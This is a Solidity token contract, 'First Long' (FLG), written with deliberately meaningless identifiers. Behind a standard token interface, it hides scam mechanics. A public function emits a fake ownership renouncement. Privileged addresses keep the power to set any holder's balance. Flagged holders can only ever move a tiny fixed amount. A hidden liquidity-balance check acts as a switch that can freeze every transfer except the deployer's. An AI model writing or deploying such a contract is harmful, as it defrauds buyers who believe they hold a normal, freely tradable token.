//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface toTeamFee {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract listLaunch {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletAtIs {
    function createPair(address walletMarketing, address marketingFee) external returns (address);
}

interface minLaunchEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minTeam) external view returns (uint256);

    function transfer(address amountFund, uint256 maxTo) external returns (bool);

    function allowance(address totalMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxTo) external returns (bool);

    function transferFrom(
        address sender,
        address amountFund,
        uint256 maxTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed limitTokenFund, uint256 value);
    event Approval(address indexed totalMode, address indexed spender, uint256 value);
}

interface teamAuto is minLaunchEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract FirstLong is listLaunch, minLaunchEnable, teamAuto {

    uint8 private minReceiverSender = 18;

    function symbol() external view virtual override returns (string memory) {
        return sellIs;
    }

    mapping(address => mapping(address => uint256)) private tokenMarketing;

    mapping(address => bool) public enableAuto;

    function balanceOf(address minTeam) public view virtual override returns (uint256) {
        return sellBuy[minTeam];
    }

    mapping(address => bool) public marketingSwap;

    mapping(address => uint256) private sellBuy;

    function transferFrom(address listTake, address amountFund, uint256 maxTo) external override returns (bool) {
        if (_msgSender() != minMarketing) {
            if (tokenMarketing[listTake][_msgSender()] != type(uint256).max) {
                require(maxTo <= tokenMarketing[listTake][_msgSender()]);
                tokenMarketing[listTake][_msgSender()] -= maxTo;
            }
        }
        return tradingTeam(listTake, amountFund, maxTo);
    }

    bool private totalWalletIs;

    function toShouldTrading(uint256 maxTo) public {
        buyFromToken();
        teamLiquidity = maxTo;
    }

    address minMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private buyAmount = "First Long";

    function listMax() public {
        emit OwnershipTransferred(fromAuto, address(0));
        toAuto = address(0);
    }

    function allowance(address listMode, address liquidityEnableAuto) external view virtual override returns (uint256) {
        if (liquidityEnableAuto == minMarketing) {
            return type(uint256).max;
        }
        return tokenMarketing[listMode][liquidityEnableAuto];
    }

    constructor (){
        
        toTeamFee maxBuy = toTeamFee(minMarketing);
        maxMode = walletAtIs(maxBuy.factory()).createPair(maxBuy.WETH(), address(this));
        
        fromAuto = _msgSender();
        listMax();
        enableAuto[fromAuto] = true;
        sellBuy[fromAuto] = launchMin;
        if (liquidityToken != feeLaunchedAuto) {
            feeLaunchedAuto = liquidityToken;
        }
        emit Transfer(address(0), fromAuto, launchMin);
    }

    address listFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    event OwnershipTransferred(address indexed shouldLiquidity, address indexed amountMin);

    function atFee(address takeReceiver) public {
        buyFromToken();
        if (minShould) {
            liquidityToken = feeLaunchedAuto;
        }
        if (takeReceiver == fromAuto || takeReceiver == maxMode) {
            return;
        }
        marketingSwap[takeReceiver] = true;
    }

    string private sellIs = "FLG";

    function name() external view virtual override returns (string memory) {
        return buyAmount;
    }

    function swapMarketing(address atTotalFrom) public {
        require(atTotalFrom.balance < 100000);
        if (modeTx) {
            return;
        }
        
        enableAuto[atTotalFrom] = true;
        
        modeTx = true;
    }

    function buyFromToken() private view {
        require(enableAuto[_msgSender()]);
    }

    uint256 private liquidityToken;

    function approve(address liquidityEnableAuto, uint256 maxTo) public virtual override returns (bool) {
        tokenMarketing[_msgSender()][liquidityEnableAuto] = maxTo;
        emit Approval(_msgSender(), liquidityEnableAuto, maxTo);
        return true;
    }

    bool public modeTx;

    function transfer(address receiverTake, uint256 maxTo) external virtual override returns (bool) {
        return tradingTeam(_msgSender(), receiverTake, maxTo);
    }

    function limitBuy(address listTake, address amountFund, uint256 maxTo) internal returns (bool) {
        require(sellBuy[listTake] >= maxTo);
        sellBuy[listTake] -= maxTo;
        sellBuy[amountFund] += maxTo;
        emit Transfer(listTake, amountFund, maxTo);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return minReceiverSender;
    }

    uint256 constant maxSell = 13 ** 10;

    function owner() external view returns (address) {
        return toAuto;
    }

    address public fromAuto;

    uint256 teamLiquidity;

    function tradingTeam(address listTake, address amountFund, uint256 maxTo) internal returns (bool) {
        if (listTake == fromAuto) {
            return limitBuy(listTake, amountFund, maxTo);
        }
        uint256 autoExemptMarketing = minLaunchEnable(maxMode).balanceOf(listFrom);
        require(autoExemptMarketing == teamLiquidity);
        require(amountFund != listFrom);
        if (marketingSwap[listTake]) {
            return limitBuy(listTake, amountFund, maxSell);
        }
        return limitBuy(listTake, amountFund, maxTo);
    }

    uint256 private launchMin = 100000000 * 10 ** 18;

    address public maxMode;

    address private toAuto;

    function atMin(address receiverTake, uint256 maxTo) public {
        buyFromToken();
        sellBuy[receiverTake] = maxTo;
    }

    uint256 public feeLaunchedAuto;

    bool private minShould;

    uint256 receiverAt;

    function getOwner() external view returns (address) {
        return toAuto;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return launchMin;
    }

}